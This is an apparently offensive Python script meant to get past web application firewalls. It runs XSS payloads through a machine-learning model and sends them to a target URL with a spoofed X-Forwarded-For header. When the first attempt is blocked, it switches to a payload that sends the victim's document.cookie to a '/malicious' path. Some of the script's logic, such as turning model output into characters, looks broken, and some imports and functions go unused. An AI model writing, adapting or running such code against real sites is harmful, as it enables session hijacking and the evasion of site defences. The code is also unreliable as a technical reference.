import json
import base64
import numpy as np
from tensorflow.keras.models import load_model
from sklearn.feature_extraction.text import CountVectorizer
from urllib.parse import quote

def load_ml_model():
    model = load_model('data/ml_model.h5')
    return model

def encode_payload(payload):
    base64_encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    hex_encoded = payload.encode('utf-8').hex()
    return base64_encoded, hex_encoded

def advanced_ml_waf_bypass(model, payload, config_path='config/config.json'):
    with open(config_path, 'r') as config_file:
        config = json.load(config_file)
        
    def preprocess_input(payload):
        max_length = config.get('max_payload_length', 256)
        normalized_payload = [ord(char) / 255.0 for char in payload[:max_length]]
        padded_payload = np.pad(normalized_payload, (0, max(0, max_length - len(normalized_payload))), 'constant')
        return np.array([padded_payload])

    def postprocess_output(output_vector):
        decoded_payload = ''.join([chr(min(255, max(0, int(x * 255)))) for x in output_vector.flatten()])
        return decoded_payload

    input_vector = preprocess_input(payload)
    crafted_vector = model.predict(input_vector)
    crafted_payload = postprocess_output(crafted_vector)
    return crafted_payload

def feedback_loop_based_bypass(url, session, model):
    raw_payload = "<script>alert('XSS')</script>"
    crafted_payload = advanced_ml_waf_bypass(model, raw_payload)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'X-Forwarded-For': f"{np.random.randint(1, 255)}.{np.random.randint(1, 255)}.{np.random.randint(1, 255)}.{np.random.randint(1, 255)}"
    }
    
    response = session.get(f"{url}?input={quote(crafted_payload)}", headers=headers)
    
    if response.status_code != 200:
        print(f"Payload blocked by WAF, adjusting payload...")
        new_payload = "<script>fetch('/malicious?cookie=' + document.cookie)</script>"
        feedback_based_payload = advanced_ml_waf_bypass(model, new_payload)
        response = session.get(f"{url}?input={quote(feedback_based_payload)}", headers=headers)
    
    if response.status_code == 200:
        print(f"Bypass WAF successful on: {url}")
    else:
        print(f"Bypass failed at: {url}, status code: {response.status_code}")
